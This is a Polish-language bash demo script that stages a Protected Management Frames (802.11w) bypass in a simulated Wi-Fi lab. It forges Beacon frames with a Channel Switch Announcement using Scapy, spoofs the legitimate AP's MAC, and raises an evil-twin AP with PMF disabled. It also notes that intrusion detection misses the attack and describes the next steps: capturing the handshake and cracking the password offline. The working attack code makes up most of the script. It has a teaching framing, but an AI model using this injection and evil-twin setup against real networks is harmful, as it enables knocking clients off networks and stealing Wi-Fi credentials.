#!/bin/bash
# ============================================================
# DEMO: Atak Beacon CSA Injection
# ============================================================
# Odpal na VM: sudo ./demo_atak_csa.sh
# Pokazuje pelny atak PMF Bypass krok po kroku
# ============================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

pause() { echo; read -p "Nacisnij ENTER aby kontynuowac..."; echo; }
header() { echo -e "${CYAN}=== $1 ===${NC}"; echo; }
ok() { echo -e "${GREEN}[OK]${NC} $1"; }
info() { echo -e "${YELLOW}[*]${NC} $1"; }
err() { echo -e "${RED}[!]${NC} $1"; }

cleanup() {
    echo
    header "Sprzatanie"
    sudo pkill hostapd 2>/dev/null || true
    sudo pkill wpa_supplicant 2>/dev/null || true
    sudo modprobe -r mac80211_hwsim 2>/dev/null || true
    ok "Posprzatane"
}

trap cleanup EXIT

# ============================================================
echo
echo "=============================================="
echo "  DEMO: PMF Bypass przez Beacon CSA Injection"
echo "=============================================="
echo
echo "Ten skrypt pokaze Ci krok po kroku jak dziala atak"
echo "omijajacy Protected Management Frames (802.11w)"
echo "przez wstrzykiwanie sfalszowanych Beaconow z CSA"
echo
echo "Wszystko dzieje sie w symulacji - zadnego fizycznego sprzetu"
echo "Kazdy krok jest opisany i wytlumaczony"
pause

# ---- Krok 1: Co to jest PMF ----
header "Krok 1: Co to jest PMF i dlaczego go omijamy"

echo "PMF (Protected Management Frames) to mechanizm 802.11w"
echo "ktory chroni ramki zarzadzania przed falszowaniem"
echo
echo "Ramki chronione przez PMF:"
echo "  - Deauthentication (subtype 12) - nie mozna wyrzucic klienta"
echo "  - Disassociation (subtype 10)  - nie mozna rozlaczyc klienta"
echo "  - Action Frames (subtype 13)   - zalezy od wersji hostapd"
echo
echo "Ramki NIE chronione przez PMF:"
echo "  - Beacon (subtype 8) - ZAWSZE niechroniony"
echo "  - To jest nasza luka"
echo
echo "Atak: wysylamy sfalszowany Beacon z informacja CSA"
echo "       (Channel Switch Announcement, IE tag 37)"
echo "       Beacon mowi 'AP zmienia kanal na 11'"
echo "       Stacja wierzy - bo Beaconow PMF nie chroni"
pause

# ---- Krok 2: Ladowanie srodowiska ----
header "Krok 2: Przygotowanie srodowiska symulacyjnego"

info "Ladowanie mac80211_hwsim (4 wirtualne karty WiFi)..."
sudo modprobe -r mac80211_hwsim 2>/dev/null || true
sleep 0.5
sudo modprobe mac80211_hwsim radios=4
sleep 2

IFACES=($(iw dev 2>/dev/null | grep -oP 'Interface \K\w+'))
AP="${IFACES[0]}"
STA="${IFACES[1]}"
INJ="${IFACES[2]}"
EVIL="${IFACES[3]}"

ok "Zaladowano 4 interfejsy:"
echo "  AP:     $AP  (kanal 6, hostapd)"
echo "  STA:    $STA  (klient, wpa_supplicant)"
echo "  INJECT: $INJ  (monitor mode, wstrzykiwanie ramek)"
echo "  EVIL:   $EVIL (Evil Twin AP, kanal 11)"
pause

# ---- Krok 3: Uruchomienie legalnego AP ----
header "Krok 3: Uruchomienie legalnego AP"

echo "Konfiguruje hostapd na $AP:"
echo "  SSID:     TestCSA"
echo "  Kanal:    6"
echo "  PMF:      required (ieee80211w=2)"
echo "  Haslo:    TestPass123"
echo

cat > /tmp/demo_ap.conf << 'EOF'
interface=PLACEHOLDER_AP
driver=nl80211
ssid=TestCSA
hw_mode=g
channel=6
wpa=2
wpa_passphrase=TestPass123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee80211w=2
beacon_int=100
ctrl_interface=/var/run/hostapd
EOF
sed -i "s/PLACEHOLDER_AP/$AP/" /tmp/demo_ap.conf

sudo ip link set "$AP" up
sudo hostapd /tmp/demo_ap.conf > /tmp/demo_ap.log 2>&1 &
AP_PID=$!
sleep 3

sudo iw dev "$AP" info | grep -q "type AP" && ok "AP dziala - PMF=2 aktywny" || err "AP nie wystartowal"
pause

# ---- Krok 4: Podlaczenie stacji ----
header "Krok 4: Podlaczenie stacji"

echo "Stacja laczy sie z legalnym AP uzywajac PMF=2"
echo "To normalne polaczenie WPA2 z ochrona PMF"
echo

cat > /tmp/demo_sta.conf << 'EOF'
ctrl_interface=/var/run/wpa_supplicant
network={
    ssid="TestCSA"
    psk="TestPass123"
    key_mgmt=WPA-PSK
    pairwise=CCMP
    ieee80211w=2
}
EOF

sudo pkill wpa_supplicant 2>/dev/null || true
sudo rm -f /var/run/wpa_supplicant/*
sleep 1

sudo ip link set "$STA" up
sudo wpa_supplicant -i "$STA" -c /tmp/demo_sta.conf -D nl80211 > /tmp/demo_sta.log 2>&1 &
STA_PID=$!

info "Czekam na polaczenie (max 15s)..."
for i in $(seq 1 15); do
    if sudo iw dev "$STA" link 2>/dev/null | grep -q "Connected"; then
        ok "Stacja polaczona z PMF=2"
        break
    fi
    sleep 1
done

sudo iw dev "$STA" link 2>/dev/null | head -3
echo
info "PMF dziala - gdybysmy teraz wyslali sfalszowany Deauth"
info "stacja by go zignorowala (PMF chroni Deauth)"
info "Ale my nie wysylamy Deauth - my wysylamy Beacon CSA"
pause

# ---- Krok 5: Przygotowanie Evil Twin ----
header "Krok 5: Uruchomienie Evil Twin AP"

echo "Evil Twin to podrobiony AP na kanale 11"
echo "Ten sam SSID (TestCSA) ale PMF=0 (wylaczony)"
echo "Dzieki temu przechwyci handshake gdy stacja sie przelaczy"
echo

cat > /tmp/demo_evil.conf << 'EOF'
interface=PLACEHOLDER_EVIL
driver=nl80211
ssid=TestCSA
hw_mode=g
channel=11
wpa=2
wpa_passphrase=TestPass123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee80211w=0
beacon_int=100
ctrl_interface=/var/run/hostapd_evil
EOF
sed -i "s/PLACEHOLDER_EVIL/$EVIL/" /tmp/demo_evil.conf

sudo ip link set "$EVIL" up
sudo hostapd /tmp/demo_evil.conf > /tmp/demo_evil.log 2>&1 &
EVIL_PID=$!
sleep 3

sudo iw dev "$EVIL" info | grep -q "type AP" && ok "Evil Twin gotowy na kanale 11" || err "Evil Twin nie wystartowal"
echo
info "Evil Twin czeka - na razie stacja go nie widzi (kanal 6 vs 11)"
pause

# ---- Krok 6: WIDS sniffer ----
header "Krok 6: Uruchomienie WIDS"

info "Startuje sniffer ramek WiFi na interfejsie $INJ (monitor mode)"
info "Sniffer bedzie zbieral wszystkie ramki zarzadzania podczas ataku"
info "Potem sprawdzimy czy WIDS wykryl cokolwiek podejrzanego"

sudo ip link set "$INJ" down
sudo iw dev "$INJ" set type monitor
sudo ip link set "$INJ" up
sudo iw dev "$INJ" set channel 6

WIDS_PCAP="/tmp/demo_wids.pcap"
sudo tcpdump -i "$INJ" -w "$WIDS_PCAP" -s 0 -I not port 22 > /dev/null 2>&1 &
TCPDUMP_PID=$!
sleep 1
ok "WIDS sniffer aktywny"
pause

# ---- Krok 7: CSA Injection ----
header "Krok 7: Atak - wstrzykiwanie Beacon CSA"

echo "TO WLASNIE JEST ATAK"
echo
echo "Wysylamy 50 sfalszowanych Beaconow z CSA IE (tag 37)"
echo "Kazdy Beacon mowi: 'AP TestCSA przenosi sie na kanal 11'"
echo
echo "Dlaczego to dziala:"
echo "  Beacon to subtype 8 - ZAWSZE non-robust wg 802.11w"
echo "  PMF nie chroni Beaconow - stacja MUSI je przetwarzac"
echo "  To fundamentalna luka w specyfikacji 802.11w"
echo

AP_MAC=$(ip -c=never link show "$AP" | grep -oP 'link/ether \K[0-9a-f:]+')
info "Adres MAC AP: $AP_MAC"
info "Wysylam 50 Beacon CSA: kanal 6 -> 11..."

sudo python3 -c "
from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
import time

ap_mac = '$AP_MAC'
csa = bytes([0x01, 11, 1])
frame = (RadioTap() /
         Dot11(type=0, subtype=8,
               addr1='ff:ff:ff:ff:ff:ff',
               addr2=ap_mac, addr3=ap_mac) /
         Dot11Beacon(timestamp=0, beacon_interval=0x0064, cap=0x0431) /
         Dot11Elt(ID='SSID', info=b'TestCSA') /
         Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24') /
         Dot11Elt(ID='DSset', info=bytes([6])) /
         Dot11Elt(ID=37, info=csa))

for i in range(50):
    sendp(frame, iface='$INJ', verbose=False)
    if i % 10 == 0:
        print(f'  Wyslano {i+1}/50 ramek...')
    time.sleep(0.1)
print('  Wszystkie 50 ramek wyslane')
"

ok "Atak zakonczony - 50 Beacon CSA wyslanych"
pause

# ---- Krok 8: Sprawdzenie efektu ----
header "Krok 8: Co sie stalo ze stacja"

echo "Sprawdzam czy stacja przelaczyla kanal..."
sleep 15

CHANNEL=$(sudo iw dev "$STA" info 2>/dev/null | grep -oP 'channel \K\d+' || echo "nieznany")

if [ "$CHANNEL" = "11" ]; then
    echo
    ok "SUKCES - stacja przelaczyla kanal 6 -> 11"
    echo
    echo "PMF zostal ominity - Beacon CSA zmusil stacje do zmiany kanalu"
    echo "W prawdziwym WiFi stacja stracilaby polaczenie z legalnym AP"
    echo "(kanal 6 vs kanal 11 to rozne czestotliwosci)"
else
    info "Kanal stacji: $CHANNEL (przed atakiem: 6)"
    echo "Jesli nadal 6 - czasem wpa_supplicant potrzebuje wiecej czasu"
    echo "Sprobuj uruchomic ponownie - atak jest powtarzalny"
fi
pause

# ---- Krok 9: WIDS evasion ----
header "Krok 9: Czy WIDS cos wykryl"

sudo kill $TCPDUMP_PID 2>/dev/null || true
sleep 1

echo "Analizuje ramki przechwycone przez WIDS..."
echo

BEACONS=$(tcpdump -r "$WIDS_PCAP" 2>/dev/null | grep -c "Beacon" || echo "0")
DEAUTH=$(tcpdump -r "$WIDS_PCAP" 2>/dev/null | grep -c "Deauth" || echo "0")
echo "  Ramki Beacon: $BEACONS"
echo "  Ramki Deauth: $DEAUTH"

echo
if [ "$DEAUTH" = "0" ]; then
    echo "WIDS NIE WYKRYL ATAKU"
    echo
    echo "Dlaczego:"
    echo "  Beacon CSA uzywa subtype 8 (Beacon)"
    echo "  Beacon to normalny ruch - kazdy AP wysyla Beacony co 100ms"
    echo "  WIDS alertuje tylko na Deauth i Disassoc (subtype 10, 12)"
    echo "  Zaden WIDS nie flaguje Beaconow jako podejrzane"
    echo
    echo "Jedyna metoda detekcji:"
    echo "  gleboka inspekcja CSA IE (tag 37) wewnatrz Beaconow"
    echo "  to wymaga customowego WIDS z deep packet inspection"
else
    echo "WIDS wykryl $DEAUTH ramek Deauth"
fi

echo "Pelny PCAP z ataku: $WIDS_PCAP"
pause

# ---- Krok 10: Co dalej ----
header "Krok 10: Podsumowanie"

echo "Co udowodnilismy:"
echo
echo "  1. PMF (802.11w) NIE chroni przed Beacon CSA"
echo "     Beacon to subtype 8 - zawsze non-robust"
echo
echo "  2. Atak dziala na wszystkich wersjach hostapd"
echo "     hostapd 2.6 i 2.10 - obie podatne"
echo
echo "  3. CERTIFICATION_ONUS nie jest potrzebne"
echo "     Beacon CSA dziala na stockowym kernelu Kali"
echo
echo "  4. WIDS nie wykrywa ataku"
echo "     Beacon to normalny ruch - WIDS go nie flaguje"
echo
echo "Co dalej w prawdziwym ataku:"
echo "  - Evil Twin na kanale 11 przechwytuje stacje"
echo "  - Stacja laczy sie z Evil Twin (ten sam SSID)"
echo "  - Atakujacy przechwytuje 4-way handshake"
echo "  - Haslo WiFi do zlamania offline (hashcat)"
echo

header "Koniec demo"
echo "Logi: /tmp/demo_ap.log /tmp/demo_sta.log /tmp/demo_evil.log"
echo "PCAP: $WIDS_PCAP"
echo
